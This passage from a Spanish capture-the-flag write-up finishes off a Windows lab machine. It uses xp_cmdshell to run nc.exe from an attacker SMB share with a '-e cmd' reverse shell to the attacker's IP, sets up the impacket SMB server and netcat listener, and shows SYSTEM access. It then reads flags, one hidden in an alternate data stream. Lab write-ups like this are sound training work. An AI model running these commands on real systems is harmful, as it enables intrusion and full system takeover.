Ejecutemos el binario de manera remota, invocándolo como recurso compartido:
```batch
SQL (sa  dbo@master)> xp_cmdshell "\\Tu_IP\smbFolder\nc.exe -e cmd Tu_IP 443"
output   
------   
NULL
```

Observa lo que pasa en nuestro **servidor SMB**:
```bash
impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
...
...
...
[*] Incoming connection (192.168.1.150,49741)
[*] AUTHENTICATE_MESSAGE (\,DESKTOP-M464J3M)
[*] User DESKTOP-M464J3M\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[-] Unknown level for query path info! 0x3b
[-] Unknown level for query path info! 0xf
```

Y observa la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.150] 49742
Microsoft Windows [Versi�n 10.0.19045.2965]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Ya solamente buscamos las flags:
```batch
C:\Windows\system32>cd C:\Users\contpaqi\Desktop
cd C:\Users\contpaqi\Desktop

C:\Users\contpaqi\Desktop> C:\Users\contpaqi\Desktop>type user.txt
type user.txt
...

C:\Users\contpaqi\Desktop>cd Users\admin\Desktop
cd Users\admin\Desktop

C:\Users\admin\Desktop> C:\Users\admin\Desktop>type root.txt
type root.txt
                      ____...                                  
             .-"--"""".__    `.                                

            |            `    |                                
  (         `._....------.._.:          
   )         .()''        ``().                                
  '          () .=='  `===  `-.         
   . )       (         g)                                
    )         )     /        J          
   (          |.   /      . (                                  
   $$         (.  (_'.   , )|`                                 

   ||         |\`-....--'/  ' \                                
  /||.         \\ | | | /  /   \.                              
 //||(\         \`-===-'  '     \o.                            
.//7' |)         `. --   / (     OObaaaad888b.                 
(<<. / |     .a888b`.__.'d\     OO888888888888a.               
 \  Y' |    .8888888aaaa88POOOOOO888888888888888.              
  \  \ |   .888888888888888888888888888888888888b              

   |   |  .d88888P88888888888888888888888b8888888.             
   b.--d .d88888P8888888888888888a:f888888|888888b             
   88888b 888888|8888888888888888888888888\8888888
```
Buena esa, parece que no tenemos la flag del **Administrador**.

Siempre es bueno revisar si hay archivos ocultos y este es el caso:
```batch
C:\Users\admin\Desktop>dir /r
dir /r
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: A622-5802

 Directorio de C:\Users\admin\Desktop

05/10/2024  07:12 PM    <DIR>          .
05/10/2024  07:12 PM    <DIR>          ..
05/10/2024  07:05 PM             1,192 root.txt
                                    35 root.txt:HI:$DATA
               1 archivos          1,192 bytes
               2 dirs   1,960,402,944 bytes libres
```
Es un poco extraño el archivo oculto.

Investigándolo, descubrimos que es un archivo tipo **Alternate Data Stream (ADS) llamado HI**:

| **Alternate Data Stream (ADS)** |
|:-----------:|
| *Un Alternate Data Stream (ADS) permite que un archivo en NTFS tenga datos ocultos adicionales sin afectar su tamaño aparente. Es una característica usada legítimamente por Windows, pero también puede ser utilizada por malware o técnicas de ocultación de información (steganografía en archivos).* |

Para poder leerlo desde la CMD, tenemos que usar el comando **more**:
```batch
C:\Users\admin\Desktop>more < root.txt:HI
more < root.txt:HI
...
```
Ahí está la flag y con esto terminamos la máquina.
